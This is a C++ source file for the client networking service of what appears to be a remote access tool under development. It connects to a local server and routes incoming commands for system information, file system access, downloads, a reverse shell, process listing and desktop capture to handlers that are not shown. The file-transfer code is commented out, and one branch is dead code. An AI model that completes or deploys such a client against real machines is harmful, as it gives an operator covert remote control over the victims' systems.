#include "NetClientService.h"
#include "../../../../Win32/ConcurrentLib/core/Thread.h"
#include "../../../shared/NetLib//packets/Packet.h"
#include "../../../shared/NetLib/packets/PacketPresentation.h"
#include "../../../shared/NetLib/packets/PacketSysInfo.h"
#include "../../../shared/NetLib/packets/PacketShell.h"
#include "../../../shared/NetLib/packets/PacketFileSystem.h"
#include "../../../shared/NetLib/packets/PacketDownload.h"
#include "../../../shared/NetLib/models/errors.h"
#include "../Application.h"
#include <WS2tcpip.h>
#include <sstream>


DWORD WINAPI listenPacketsToBeSentThreadFunc(LPVOID threadArg)
{
	auto netServerService = static_cast<NetClientService*>(threadArg);
	netServerService->loopPacketsQueue();
	return 0;
}

NetClientService::NetClientService(Application* application):
	application(application)
{
}


NetClientService::~NetClientService() = default;

bool NetClientService::ReceivePacket(PacketType packet)
{
	return false;
}


void NetClientService::handlePacket(const Packet* packet)
{
	if (packet == nullptr)
		return;

	switch (packet->getType())
	{
	case PacketType::Camera: //Packet Type: chat message

		break;
	case PacketType::FileSystem:
		{
			/*
			std::string FileName; //string to store file name
			if (!GetString(ID, FileName)) //If issue getting file name
				return false; //Failure to process packetType

			connections[ID]->file.infileStream.open(FileName, std::ios::binary | std::ios::ate);
			//Open file to read in binary | ate mode. We use ate so we can use tellg to get file size. We use binary because we need to read bytes as raw data
			if (!connections[ID]->file.infileStream.is_open()) //If file is not open? (Error opening file?)
			{
				std::cout << "Client: " << ID << " requested file: " << FileName << ", but that file does not exist." <<
					std::endl;
				return true;
			}

			connections[ID]->file.fileName = FileName;
			//set file name just so we can print it out after done transferring
			connections[ID]->file.fileSize = connections[ID]->file.infileStream.tellg(); //Get file size
			connections[ID]->file.infileStream.seekg(0);
			//Set cursor position in file back to offset 0 for when we read file
			connections[ID]->file.fileOffset = 0; //Update file offset for knowing when we hit end of file

			if (!HandleSendFile(ID)) //Attempt to send byte buffer from file. If failure...
				return false;
			*/
			break;
		}
	default: break;
	}

	// netEventChannel.submitToApp(nullptr);
}


UUID* NetClientService::getUuid()
{
	return clientUuid;
}

DWORD NetClientService::start()
{
	setSocketDescriptor(socket(AF_INET, SOCK_STREAM, IPPROTO_TCP));
	DWORD returnCode = 0;
	try
	{
		connectToIpAddress("127.0.0.1", 3002);
		shouldBeRunning = true;

		packetSendThread = new Thread(static_cast<LPTHREAD_START_ROUTINE>(listenPacketsToBeSentThreadFunc),
		                              static_cast<PVOID>(this));
		packetSendThread->run();

		threadPool.post([this]
		{
			application->onConnectionEstablished();
		});

		interact();
	}
	catch (NetError& err)
	{
		std::ostringstream ss;
		ss << err.messageChar;
		ss << " Error Code: " << err.errorCode;

		const std::string errorMessage = ss.str();
		application->onClientExited(errorMessage.c_str());

		returnCode = -1;
	}

	application->onClientExited("Interact loop finished");
	return returnCode;
}

void NetClientService::onDisconnected()
{
	application->onClientExited("Disconnected");
}

void NetClientService::onPacketReceived(PacketType packetType, char* payloadBuffer, size_t payloadLength)
{
	if (packetType == PacketType::ClientInformation)
	{
		PacketPresentation* packet = PacketPresentation::deserialize(payloadBuffer,
		                                                             payloadLength);
		threadPool.post([&, this]
		{
			application->onSystemInformationRequested(packet);
		});
	}
	else if (packetType == PacketType::ClientInformation)
	{
		PacketSysInfo* packet = PacketSysInfo::deserialize(payloadBuffer,
		                                                   payloadLength);
	}
	else if (packetType == PacketType::FileSystem)
	{
		PacketFileSystem* packet = PacketFileSystem::deserialize(payloadBuffer, payloadLength);
		application->onFileSystemRequested(packet);
	}
	else if (packetType == PacketType::Download)
	{
		PacketDownload* packet = PacketDownload::deserialize(payloadBuffer, payloadLength);
	}
	else if (packetType == PacketType::ReverseShell)
	{
		PacketShell* packetShell = PacketShell::deserialize(payloadBuffer, payloadLength);

		threadPool.post([packetShell, this]
		{
			application->shellAction(packetShell->action, packetShell->data);
		});
	}
	else if (packetType == PacketType::ProcessList)
	{
		threadPool.post([this]
		{
			application->onProcessListRequested();
		});
	}
	else if (packetType == PacketType::Desktop)
	{
		threadPool.post([this]
		{
			application->desktopRequested();
		});
	}
}

void NetClientService::sendPacket(Packet* packet)
{
	std::unique_lock<std::mutex> lock(outPacketsMutex);
	packetsToBeSent.push(packet);
	cv.notify_one();
}


void NetClientService::loopPacketsQueue()
{
	Packet* packet;
	SOCKET uuid;
	// std::shared_ptr<NetClientService> client;
	NetClientService* client;


	while (shouldBeRunning)
	{
		// TODO: Review alternative approaches? 
		/*clientsMutex->lock();
		packet = packetsToBeSent.front();
		uuid = packet->getDestination();
		client = getClientByUuid(uuid);
		client->sendPacket(packet);
		clientsMutex->unlock();
		*/

		std::unique_lock<std::mutex> lock(outPacketsMutex);
		if (!packetsToBeSent.empty())
		{
			packet = packetsToBeSent.front();
			BaseNetClientService::sendPacket(packet);
		}
		else
		{
			cv.wait(lock, [this] { return !packetsToBeSent.empty(); });
			packet = packetsToBeSent.front();
			BaseNetClientService::sendPacket(packet);
		}
		packetsToBeSent.pop();
	}
}

bool NetClientService::HandleSendFile(int ID)
{
	return true;
	/*
	if (connections[ID]->file.fileOffset >= connections[ID]->file.fileSize)
		//If end of file reached then return true and skip sending any bytes
		return true;
	if (!SendPacketType(ID, PacketType::FileTransferByteBuffer)) //Send packet type for file transfer byte buffer
		return false;

	connections[ID]->file.remainingBytes = connections[ID]->file.fileSize - connections[ID]->file.fileOffset;
	//calculate remaining bytes
	if (connections[ID]->file.remainingBytes > connections[ID]->file.buffersize) //if remaining bytes > max byte buffer
	{
		connections[ID]->file.infileStream.read(connections[ID]->file.buffer, connections[ID]->file.buffersize);
		//read in max buffer size bytes
		if (!Sendint32_t(ID, connections[ID]->file.buffersize)) //send int of buffer size
			return false;
		if (!sendall(ID, connections[ID]->file.buffer, connections[ID]->file.buffersize)) //send bytes for buffer
			return false;
		connections[ID]->file.fileOffset += connections[ID]->file.buffersize;
		//increment fileoffset by # of bytes written
	}
	else
	{
		connections[ID]->file.infileStream.read(connections[ID]->file.buffer, connections[ID]->file.remainingBytes);
		//read in remaining bytes
		if (!Sendint32_t(ID, connections[ID]->file.remainingBytes)) //send int of buffer size
			return false;
		if (!sendall(ID, connections[ID]->file.buffer, connections[ID]->file.remainingBytes)) //send bytes for buffer
			return false;
		connections[ID]->file.fileOffset += connections[ID]->file.remainingBytes;
		//increment fileoffset by # of bytes written
	}

	if (connections[ID]->file.fileOffset == connections[ID]->file.fileSize) //If we are at end of file
	{
		if (!SendPacketType(ID, PacketType::FileTransfer_EndOfFile)) //Send end of file packet
			return false;
		//Print out data on server details about file that was sent
		std::cout << std::endl << "File sent: " << connections[ID]->file.fileName << std::endl;
		std::cout << "File size(bytes): " << connections[ID]->file.fileSize << std::endl << std::endl;
	}
	return true;
	*/
}
